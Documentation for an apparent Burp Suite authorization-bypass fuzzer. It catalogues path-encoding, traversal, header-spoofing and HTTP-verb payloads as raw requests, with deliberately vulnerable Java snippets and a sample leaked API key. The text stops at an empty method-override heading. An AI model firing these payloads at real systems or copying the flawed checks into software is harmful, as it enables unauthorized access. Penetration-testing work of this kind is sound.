# AuthZ Bypass Playbooks

The `Bypass` tab is the main authorization-bypass testing area.

The registry lives in `src/main/java/com/bypassfuzzer/burp/core/attacks/AttackRegistry.java`.

This page is meant to read like an operator guide, not a payload dump. It shows why each attack family exists, what the raw requests look like on the wire, and the kind of broken target logic each family is meant to expose.

## Table of Contents

- [Why This Is In The Tool](#why-this-is-in-the-tool)
- [Core Flow](#core-flow)
- [Target-Preserving Guarantee](#target-preserving-guarantee)
- [Naming Scheme](#naming-scheme)
- [Path Playbooks](#path-playbooks)
  - [`bypass.path.case_variants`](#bypasspathcase_variants)
  - [`bypass.path.per_char_encoding`](#bypasspathper_char_encoding)
  - [`bypass.path.double_encoding`](#bypasspathdouble_encoding)
  - [`bypass.path.head_traversal`](#bypasspathhead_traversal)
  - [`bypass.path.sacrificial_prefix`](#bypasspathsacrificial_prefix)
  - [`bypass.path.matrix_suffix`](#bypasspathmatrix_suffix)
  - [`bypass.path.trailing_variations`](#bypasspathtrailing_variations)
  - [`bypass.path.between_noop`](#bypasspathbetween_noop)
  - [`bypass.path.cross_encoding_chains`](#bypasspathcross_encoding_chains)
  - [`bypass.path.depth_chain`](#bypasspathdepth_chain)
  - [`bypass.path.unicode_lookalike`](#bypasspathunicode_lookalike)
  - [`bypass.path.splitter_via_stripped_chars`](#bypasspathsplitter_via_stripped_chars)
- [Header Playbooks](#header-playbooks)
  - [`bypass.header.override_url`](#bypassheaderoverride_url)
  - [`bypass.header.forwarded_ip`](#bypassheaderforwarded_ip)
  - [`bypass.header.cdn_origin_ip`](#bypassheadercdn_origin_ip)
  - [`bypass.header.host_rewrite`](#bypassheaderhost_rewrite)
  - [`bypass.header.auth_bypass`](#bypassheaderauth_bypass)
  - [`bypass.header.protocol_scheme`](#bypassheaderprotocol_scheme)
  - [`bypass.header.known_tokens`](#bypassheaderknown_tokens)
- [Verb Playbooks](#verb-playbooks)
  - [`bypass.verb.method_switch`](#bypassverbmethod_switch)
  - [`bypass.verb.method_case`](#bypassverbmethod_case)
  - [`bypass.verb.method_prefix`](#bypassverbmethod_prefix)
  - [`bypass.verb.method_override`](#bypassverbmethod_override)
  - [`bypass.verb.param_migration`](#bypassverbparam_migration)
- [Param & Cookie Playbooks](#param--cookie-playbooks)
  - [`bypass.param.existing_fuzz`](#bypassparamexisting_fuzz)
  - [`bypass.param.new_injection`](#bypassparamnew_injection)
  - [`bypass.cookie.existing_fuzz`](#bypasscookieexisting_fuzz)
  - [`bypass.cookie.new_injection`](#bypasscookienew_injection)
- [Trailing Boundary Playbooks](#trailing-boundary-playbooks)
  - [`bypass.trailingslash`](#bypasstrailingslash)
  - [`bypass.trailingdot`](#bypasstrailingdot)
- [Extension Playbook](#extension-playbook)
  - [`bypass.extension.hijack`](#bypassextensionhijack)
- [Content-Type Playbooks](#content-type-playbooks)
  - [`bypass.contenttype.form_url_encoded`](#bypasscontenttypeform_url_encoded)
  - [`bypass.contenttype.json`](#bypasscontenttypejson)
  - [`bypass.contenttype.xml`](#bypasscontenttypexml)
  - [`bypass.contenttype.multipart`](#bypasscontenttypemultipart)
- [Encoding Playbooks](#encoding-playbooks)
  - [`bypass.encoding.url`](#bypassencodingurl)
  - [`bypass.encoding.double_url`](#bypassencodingdouble_url)
  - [`bypass.encoding.triple_url`](#bypassencodingtriple_url)
  - [`bypass.encoding.iis_unicode`](#bypassencodingiis_unicode)
  - [`bypass.encoding.java_escape`](#bypassencodingjava_escape)
  - [`bypass.encoding.unicode_overflow`](#bypassencodingunicode_overflow)
- [Protocol Playbooks](#protocol-playbooks)
  - [`bypass.protocol.http2`](#bypassprotocolhttp2)
  - [`bypass.protocol.http1_1`](#bypassprotocolhttp1_1)
  - [`bypass.protocol.http1_0`](#bypassprotocolhttp1_0)
  - [`bypass.protocol.http0_9`](#bypassprotocolhttp0_9)
- [Case Playbook](#case-playbook)
  - [`bypass.case.whole_request_case`](#bypasscasewhole_request_case)
- [Notes For Future Additions](#notes-for-future-additions)
- [Documentation Rule](#documentation-rule)

## Why This Is In The Tool

The workflow is different from an IDOR/BOLA workflow. The tester has:

- one protected endpoint that is returning `401` or `403`
- the belief that the underlying handler is reachable if the request looks like "not that endpoint" to whichever layer is enforcing the ACL

The job of the tab is to generate variants of the same request whose bytes on the wire look different to a WAF, proxy, or route-matcher but still resolve to the same protected handler after normalization. The results answer a specific question:

"What request shape still reaches this endpoint but sidesteps the layer that said no?"

This is fundamentally a normalization-disagreement attack, not a path-traversal attack. Every variant is meant to be target-preserving — the handler still runs on the originally-requested path after server-side normalization.

## Core Flow

The Bypass tab does one thing in order, once per selected attack family:

1. take the original request as the control
2. generate attack-family-specific variants of that request
3. send each variant through the same session scaffolding (cookies, headers, rate limiting, session preflight) as the control
4. score each response against the control so the operator can see which mutations changed behavior

Per-family generation happens in `src/main/java/com/bypassfuzzer/burp/core/attacks/*Attack.java`. The path family in particular is built on top of `UrlPayloadProcessor` which expands the embedded `url_payloads.txt` file into thousands of target-preserving variants at run time.

Every HTTP attempt remains visible in the results table, including configured throttle statuses such
as `429` and `503`. Bypass automatically retries those payloads up to three times, labels each row
`[throttle retry #N]`, and leaves requests that never reach a non-throttle outcome in the shared
`Retry queue`. Automatic retry scheduling is bounded; if that capacity is reached, the response is
still retained and the request remains available for manual retry instead of being silently dropped.

The session status keeps four different quantities separate: selected payloads planned, actual HTTP
requests sent, results recorded, and requests still deferred. The `#` column identifies result rows;
it is not the count of requests observed in Burp Logger.

## Target-Preserving Guarantee

For the path family the tool enforces a target-preserving contract:

- traversal payloads (`../`, `..;/`, `%2e%2e/`, etc.) are injected only at segment 0 via `PREFIX` or as a new first segment via `HEAD`. Mid-path traversal reroutes to a different endpoint, so it is skipped.
- `BETWEEN` insertion (payload becomes its own new segment between existing ones) is only used for no-op payloads (`.`, `%2e`) that normalize away harmlessly.
- auto-generated cross-encoding chains (`../..%2f`, `..;/%2e%2e%2f`) are always `PREFIX`+`HEAD` only, never mid-path.
- non-traversal payloads (matrix params, dots, suffixes) keep full per-segment fan-out because they do not reroute the request.

Result: every URL emitted still resolves to the originally requested endpoint after normalization. A 200 means the AuthZ boundary was bypassed for the target, not that a different non-protected endpoint got hit.

## Naming Scheme

- `bypass.path.*`
  Path and URL normalization disagreements between the ACL layer and the router.
- `bypass.header.*`
  Client-controlled headers the stack trusts for identity, origin IP, URL rewriting, or auth.
- `bypass.verb.*`
  HTTP method coverage gaps, method casing, method-override headers, param migration.
- `bypass.param.*`
  Query-string toggles — existing-param value fuzz and new debug-param injection.
- `bypass.cookie.*`
  The same toggles carried through cookies.
- `bypass.trailingslash.*` / `bypass.trailingdot.*`
  Dedicated boundary tests for terminal-character disagreements.
- `bypass.extension.*`
  File-extension routing and auth-split surface.
- `bypass.contenttype.*`
  Parser-driven authorization branching based on declared `Content-Type`.
- `bypass.encoding.*`
  Multi-level and non-ASCII encoding disagreements applied across the request.
- `bypass.protocol.*`
  Alternate HTTP-version parsing branches.
- `bypass.case.*`
  Case-sensitivity disagreements across the whole request.

---

## Path Playbooks

### `bypass.path.case_variants`

Display name:
`Case Variants`

### Purpose

This playbook exists because one layer may compare path segments case-sensitively while another normalizes case before routing or looking up handlers. Per-segment case combinations up to 2⁴=16 variants and a whole-path all-upper / all-lower pass are emitted deterministically.

### Raw HTTP Examples

Starting point:

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

Representative variants:

```http
GET /Admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /ADMIN HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /aDmIn HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /API/ADMIN/USERS HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if (request.path().startsWith("/admin")) {
    requireAdmin();
}

route(request.path().toLowerCase());
```

```java
// IIS default case-insensitive routing with a case-sensitive WAF rule in front
if (request.path().matches("^/admin(/.*)?$")) {
    deny();
}
```

---

### `bypass.path.per_char_encoding`

Display name:
`Per-Character Segment Encoding`

### Purpose

This playbook exists because some WAF rules match the segment text literally before URL decoding happens on the origin. Encoding individual chars of the target segment preserves the target after decoding but slips past exact-match ACLs.

Single-level (`%61`), double-level (`%2561`), and fully-encoded segment (`%61%64%6d%69%6e`) forms are emitted. Hex case is auto-expanded so `/%6a` and `/%6A` are both tried.

### Raw HTTP Examples

```http
GET /%61dmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /adm%69n HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%61%64%6d%69%6e HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%2561dmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if (request.rawPath().equals("/admin")) {
    requireAdmin();
}

String decoded = urlDecode(request.rawPath());
route(decoded);
```

```java
// WAF regex matches the literal request line
if (request.line().matches(".*\\s/admin\\s.*")) {
    deny();
}
// Application server decodes %61 -> a before dispatching
```

---

### `bypass.path.double_encoding`

Display name:
`Double-Encoded + Decoder-Case`

### Purpose

This playbook exists because some stacks percent-decode the request path exactly once, others decode twice, and some decode at different points. Crucially, some decoders are case-sensitive on the inner hex: React for example treats `%252F` (uppercase F) differently from `%252f` (lowercase f). The file and the auto-expander emit both upper and lower hex case of every double-encoded payload.

### Raw HTTP Examples

```http
GET /%252Fadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%252fadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%252E%252E%252Fadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%25%32%66admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// Rewrite layer decodes once, AuthZ checks the single-decoded form
String onceDecoded = urlDecode(request.rawPath());
if (onceDecoded.equals("/admin")) {
    requireAdmin();
}

// Downstream router decodes a second time
return handlerRouter.dispatch(urlDecode(onceDecoded));
```

---

### `bypass.path.head_traversal`

Display name:
`HEAD-Insert Traversal`

### Purpose

This playbook exists because a WAF that regex-matches `/admin` exactly sees `/..;/admin` or `/../admin` as a different path, while the origin's normalizer collapses the leading traversal and the handler still runs on `/admin`. The traversal payload is inserted as a new first segment only — never mid-path — to preserve the target endpoint.

### Raw HTTP Examples

```http
GET /..;/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /../admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%2e%2e/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%c0%ae%c0%ae/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// ACL layer treats the raw path as opaque
if (request.rawPath().startsWith("/admin")) {
    deny();
}

// Router normalizes ../../ away before dispatching
return router.dispatch(normalize(request.rawPath()));
```

---

### `bypass.path.sacrificial_prefix`

Display name:
`Sacrificial-Prefix Segment + Traversal`

### Purpose

This playbook exists because a WAF that regex-matches `/admin` may not match `/x/../admin` — yet both resolve to `/admin` on the origin after normalization. Using a "whitelist-friendly" placeholder segment (`/static/../admin`, `/public/../admin`, `/assets/../admin`) compounds the bypass: frameworks often explicitly exempt those asset-serving prefixes from AuthZ middleware, so the ACL check is skipped entirely before the normalizer runs.

### Raw HTTP Examples

Anonymous placeholder:

```http
GET /x/../admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /x;/../admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /x%2f..%2fadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

WAF-whitelist prefixes (the real bypass shape):

```http
GET /static/../admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /public/../admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /assets/../admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// AuthZ middleware runs only on paths not matching the static prefix
if (!request.path().startsWith("/static/")
        && !request.path().startsWith("/public/")) {
    requireAuth(request);
}

// Dispatcher normalizes /static/../admin to /admin and runs the admin handler
return router.dispatch(normalize(request.path()));
```

```java
// Simpler shape: WAF regex never matches because the raw line starts with /x/
if (request.line().matches(".*\\s/admin\\s.*")) {
    deny();
}
```

---

### `bypass.path.matrix_suffix`

Display name:
`Matrix Parameter / Session-ID Suffix`

### Purpose

This playbook exists because Tomcat, Jetty, and Spring strip `;foo=bar`-style matrix parameters off each segment before routing, so the handler still runs on `/admin`. A WAF that regex-matches the literal path string sees `/admin;jsessionid=X` and often fails to match its `/admin` rule. Suffix-only injection keeps the target segment intact.

### Raw HTTP Examples

```http
GET /admin;jsessionid=1 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin;foo=bar HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin%3bjsessionid=1 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin; HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// WAF ACL with exact-match regex
if (request.path().equals("/admin")) {
    deny();
}

// Servlet container strips ;jsessionid= and dispatches to the admin handler
servletContainer.service(request);
```

---

### `bypass.path.trailing_variations`

Display name:
`Trailing Variations`

### Purpose

This playbook exists because `/admin` and `/admin/` do not always pass through the same normalization or authorization logic. Many frameworks add a trailing slash behind the scenes and route both forms to the same handler, but the ACL often matches only one. Trailing-dot, trailing-whitespace, and trailing-control-byte variants probe the same disagreement.

### Raw HTTP Examples

```http
GET /admin/ HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin. HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin/. HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin%20 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin%09 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin%00 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if ("/admin".equals(request.path())) {
    requireAdmin();
}

return router.dispatch(stripTrailingSlash(normalize(request.path())));
```

---

### `bypass.path.between_noop`

Display name:
`Between-Segment No-Op Markers`

### Purpose

This playbook exists because some normalizers and some ACL regex engines disagree on whether a `.` segment is meaningful. Inserting current-directory markers (`.`, `%2e`) as their own segments between existing ones preserves the target path after normalization but changes the byte shape the ACL sees. Because `.` and `%2e` are no-ops, this is the only payload family that safely supports `BETWEEN` insertion at every position.

### Raw HTTP Examples

```http
GET /./admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin/. HTTP/1.1
Host: target.example
Cookie: session=user-session
```

For a multi-segment target:

```http
GET /api/./admin/users HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /api/admin/./users HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%2e/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// ACL compares literal segments; doesn't collapse '.' before matching
if (Arrays.asList(request.path().split("/")).contains("admin")
        && !hasAdminRole(user)) {
    deny();
}

// Router resolves ./ segments transparently
route(normalize(request.path()));
```

---

### `bypass.path.cross_encoding_chains`

Display name:
`Cross-Encoding Traversal Chains`

### Purpose

This playbook exists because different layers of the stack can decode different encodings. A payload that mixes two or three encoding styles (`../..%2f`, `..;/%2e%2e%2f`) splits the normalization work across layers — the WAF decodes one form, the origin decodes the other, and neither sees the full traversal. Two-element chains (20) and three-element chains (60 all-distinct combinations) are generated at runtime from the primitives `../`, `..%2f`, `..;/`, `%2e%2e/`, `%2e%2e%2f`. Injected only as `PREFIX` or `HEAD`.

### Raw HTTP Examples

```http
GET /../..%2fadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /..;/%2e%2e%2fadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /../..%2f..;/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%2e%2e/..%2f../admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// WAF only decodes %-encoding once, sees ../..%2f literally, no match against /admin
if (request.rawPath().matches(".*/admin(/|$).*")) {
    deny();
}

// Origin decodes %2f, then normalizes ../, then dispatches
return router.dispatch(urlDecode(request.rawPath()));
```

---

### `bypass.path.depth_chain`

Display name:
`Depth-Chained Traversal`

### Purpose

This playbook exists because some WAFs and proxies give up after N passes of `..` collapse and forward the leftover unchopped traversal to the origin, which keeps normalizing and lands on the target. The file carries depth-2 through depth-5 chains for every primitive, including overlong UTF-8, fullwidth Unicode, raw backslash, and encoded backslash.

### Raw HTTP Examples

```http
GET /..;/..;/..;/..;/..;/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /..%2f..%2f..%2f..%2fadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /..\..\..\admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// WAF uses bounded normalization
String normalized = collapseDotDotUpToDepth(request.rawPath(), 3);
if (normalized.equals("/admin")) {
    deny();
}

// Origin normalizes fully and lands on /admin
route(fullyNormalize(request.rawPath()));
```

---

### `bypass.path.unicode_lookalike`

Display name:
`Unicode / Overlong Lookalikes`

### Purpose

This playbook exists because some decoders accept non-ASCII characters that look like, or decode to, ASCII path separators and dots. Overlong UTF-8 (`%c0%ae` for dot, `%c0%af` for slash), fullwidth Unicode (`%ef%bc%8e` for dot, `%ef%bc%8f` for slash), and mathematical lookalikes (division slash `U+2215`, fraction slash `U+2044`) are all covered.

### Raw HTTP Examples

```http
GET /%c0%af..%c0%afadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%ef%bc%8f..%ef%bc%8fadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%e2%88%95admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%c0%ae%c0%ae/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// ACL sees exotic UTF-8 bytes and does not match /admin
if (request.rawPath().equals("/admin")) {
    deny();
}

// Older decoder accepts overlong UTF-8 and treats %c0%af as '/'
route(permissiveUtf8Decode(request.rawPath()));
```

---

### `bypass.path.splitter_via_stripped_chars`

Display name:
`Splitter via Stripped Control Chars`

### Purpose

This playbook exists because some server normalizers strip whitespace and control bytes *after* percent-decoding but *before* splitting the path. A payload like `%2e%09%2e` decodes to `.<TAB>.`, then the tab is stripped, leaving `..` — a traversal that a WAF looking at the raw or once-decoded form never sees.

This is the class of bypass where `fetch()` and other WHATWG URL parsers strip literal tabs, and many backends replicate the pattern post-decode.

### Raw HTTP Examples

```http
GET /%2e%09%2e/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%2f%2e%09%2e%5cadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /.%09./admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%2e%0a%2e/admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// WAF inspects the raw or once-decoded path, sees '.\t.' never ..
if (request.rawPath().contains("..")) {
    deny();
}

// Origin decodes then strips tabs/CRLF, then splits on /
String decoded = urlDecode(request.rawPath());
String stripped = decoded.replaceAll("[\\t\\n\\r]", "");
route(normalize(stripped));
```

---

## Header Playbooks

The `bypass.header.*` family loads 280+ header templates from `src/main/resources/payloads/header_payload_templates.txt`. Templates support placeholders (`{IP PAYLOAD}`, `{OOB PAYLOAD}`, `{URL PAYLOAD}`, `{PATH SWAP}`) that are substituted at runtime with IP list rotations, collaborator domains, and path-rewrite combinations.

### `bypass.header.override_url`

Display name:
`URL-Rewrite Headers`

### Purpose

This playbook exists because some stacks honor a client-supplied `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-URI`, `X-Original-Path`, or similar header as the effective request path. A request sent to `/` can be authorized as `/` but handled as `/admin` purely because of the header. The `[PATH_SWAP]` template variant sends `GET /` on the request line while injecting the target path via the header.

### Raw HTTP Examples

```http
GET / HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Original-URL: /admin
```

```http
GET /public HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Rewrite-URL: /admin
```

```http
GET /public HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Forwarded-Uri: /admin
```

```http
GET / HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Original-Path: /admin
```

### What The Broken Target Code Might Look Like

```java
String effectivePath = request.header("X-Original-URL");
if (effectivePath == null) {
    effectivePath = request.path();
}

if (effectivePath.startsWith("/admin")) {
    return adminHandler(request);
}
```

```java
// Common pattern in IIS + ARR / Kong / some Apache setups
String rewritten = request.header("X-Rewrite-URL");
if (rewritten != null) request.setPath(rewritten);

// AuthZ ran against the original / before rewrite
```

---

### `bypass.header.forwarded_ip`

Display name:
`Forwarded-IP Spoofing`

### Purpose

This playbook exists because reverse proxies commonly trust client-sourced IP headers — `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `True-Client-IP`, `X-Originating-IP` — and many applications grant elevated access to internal addresses. Template IP values include loopback, RFC1918, IPv6 representations, and hex / decimal encodings to probe normalizers.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Forwarded-For: 127.0.0.1
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Real-IP: 10.0.0.1
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Forwarded-For: ::ffff:7f00:0001
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Forwarded-For: 0x7f000001
```

### What The Broken Target Code Might Look Like

```java
String clientIp = request.header("X-Forwarded-For");
if (clientIp != null && (clientIp.startsWith("127.") || clientIp.startsWith("10."))) {
    skipAuthorization = true;
}
```

```java
// Uses the first XFF value without validating the trust chain
String ip = request.header("X-Forwarded-For").split(",")[0];
if (internalNetwork.contains(ip)) {
    allowInternalOnlyRoute();
}
```

---

### `bypass.header.cdn_origin_ip`

Display name:
`CDN Origin-IP Headers`

### Purpose

This playbook exists because requests fronted by Cloudflare, Fastly, Akamai, or Imperva often pass through headers the origin trusts implicitly — `CF-Connecting-IP`, `Fastly-Client-IP`, `True-Client-IP`, `Incap-Client-IP`. If an attacker can hit the origin directly (bypassing the CDN) or if the CDN doesn't strip these from client input, spoofing the "trusted source" IP passes origin-side ACLs.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
CF-Connecting-IP: 127.0.0.1
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Fastly-Client-IP: 127.0.0.1
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Incap-Client-IP: 10.0.0.1
```

### What The Broken Target Code Might Look Like

```java
// Origin assumes CF-Connecting-IP is always set by Cloudflare
String realIp = request.header("CF-Connecting-IP");
if ("127.0.0.1".equals(realIp) || internalRanges.contains(realIp)) {
    markAsInternal();
}
```

---

### `bypass.header.host_rewrite`

Display name:
`Host / Proxy-Host Rewrite`

### Purpose

This playbook exists because some stacks use headers like `Proxy-Host`, `Base-URL`, `Destination`, `X-Host`, or `X-HTTP-Host-Override` to determine the effective host for routing and virtual-host selection. A request whose `Host` header maps to one virtual host but whose `X-HTTP-Host-Override` maps to another can land on a handler the `Host`-based AuthZ never saw.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: public.target.example
Cookie: session=user-session
X-HTTP-Host-Override: admin.target.example
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Base-Url: https://admin.target.example
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Destination: admin.target.example
```

### What The Broken Target Code Might Look Like

```java
String effectiveHost = request.header("X-HTTP-Host-Override");
if (effectiveHost == null) {
    effectiveHost = request.host();
}

virtualHostRouter.dispatch(effectiveHost, request);
```

---

### `bypass.header.auth_bypass`

Display name:
`Authorization-Header Games`

### Purpose

This playbook exists because some middleware treats the presence of *any* `Authorization` header as "authenticated enough" to skip an AuthN filter and hand the request straight to a handler whose AuthZ check expects upstream AuthN to have already succeeded. Variations include `Authorization: Basic A` (trivially invalid), `Bearer` with arbitrary values, `Proxy-Authorization`, and OOB-substituted tokens used for blind-detect scenarios.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Authorization: Basic A
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Authorization: Bearer {OOB_PAYLOAD}
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Proxy-Authorization: Basic YWRtaW46YWRtaW4=
```

### What The Broken Target Code Might Look Like

```java
// Filter short-circuits if any Authorization header is present
if (request.header("Authorization") != null) {
    markAsAuthenticated(request);
}

// Downstream handler trusts the marker
if (request.isAuthenticated()) {
    return sensitiveHandler(request);
}
```

---

### `bypass.header.protocol_scheme`

Display name:
`Forwarded-Protocol / Scheme`

### Purpose

This playbook exists because some apps gate access on the transport the request appears to have come in over: `X-Forwarded-Proto: https` may be required, absent, or implicitly trusted. Flipping these headers between `http` and `https`, or introducing schemes the app doesn't expect, can bypass an "HTTPS-required" check or trigger a legacy-HTTP-only code path.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Forwarded-Proto: http
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Forwarded-Scheme: https
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Front-End-Https: on
```

### What The Broken Target Code Might Look Like

```java
// Middleware trusts the header, origin is never directly TLS-terminated
boolean isSecure = "https".equalsIgnoreCase(request.header("X-Forwarded-Proto"));
if (!isSecure) {
    return redirectToHttps(request);
}
// /admin handler runs whenever the check is skipped
```

---

### `bypass.header.known_tokens`

Display name:
`Static / Leaked Token Headers`

### Purpose

This playbook exists because corporate and third-party stacks carry well-known or leaked hardcoded tokens — an API-gateway subscription key, a device-ID header, a framework-internal CSRF token — that some deployments still trust. The template list carries a handful of these (e.g. `X-CSRFToken: DECAFC0FFEEBAD`, `Ocp-Apim-Subscription-Key: <leaked>`, `X-Att-Deviceid`).

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-CSRFToken: DECAFC0FFEEBAD
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Ocp-Apim-Subscription-Key: abc12345a76b45c786589849abc7143
```

### What The Broken Target Code Might Look Like

```java
// Legacy endpoint trusts a specific internal header that survived a refactor
if ("DECAFC0FFEEBAD".equals(request.header("X-CSRFToken"))) {
    skipCsrfValidation = true;
}
```

---

## Verb Playbooks

### `bypass.verb.method_switch`

Display name:
`Method Switch`

### Purpose

This playbook exists because authorization checks are often wired to one method — usually `GET` or `POST` — and other verbs fall into a default branch without the same check. `HEAD`, `OPTIONS`, `PATCH`, `DELETE`, `PUT`, `TRACE`, and `CONNECT` on the same path can reveal the gap.

### Raw HTTP Examples

```http
HEAD /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
OPTIONS /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
PATCH /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{}
```

```http
TRACE /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if ("GET".equals(request.method()) && request.path().startsWith("/admin")) {
    requireAdmin(request);
}

// All other methods fall through to the default handler
handleRequest(request);
```

---

### `bypass.verb.method_case`

Display name:
`Method Casing`

### Purpose

This playbook exists because some servers uppercase the method before dispatch but the WAF/middleware matches case-sensitively. `get /admin` can slip a rule that only matches `GET /admin`, but the handler still runs.

### Raw HTTP Examples

```http
get /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
Get /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
gEt /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// Case-sensitive method comparison in a security filter
if ("GET".equals(request.method()) && isProtected(request.path())) {
    requireAdmin();
}

// Handler normalizes to upper-case internally
dispatcher.dispatch(request.method().toUpperCase(), request);
```

---

### `bypass.verb.method_prefix`

Display name:
`Method Prefix / Suffix Mutation`

### Purpose

This playbook exists because some HTTP parsers are lenient about the method token and will coerce an unknown or garbled method back to a known one (or fall through to a default). `XGET` and `GETX` probe whether the parser is doing fuzzy matching that the security filter isn't.

### Raw HTTP Examples

```http
XGET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GETX /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
XPOST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{}
```

### What The Broken Target Code Might Look Like

```java
// Parser treats XGET as an extension method, falls back to a default dispatcher
if (Arrays.asList(ALLOWED_METHODS).contains(request.method())) {
    applySecurityFilter();
} else {
    dispatchAsGet(request);
}
```

---

### `bypass.verb.method_override`

Display name:
`X-HTTP-Method-Override`

### Purpose

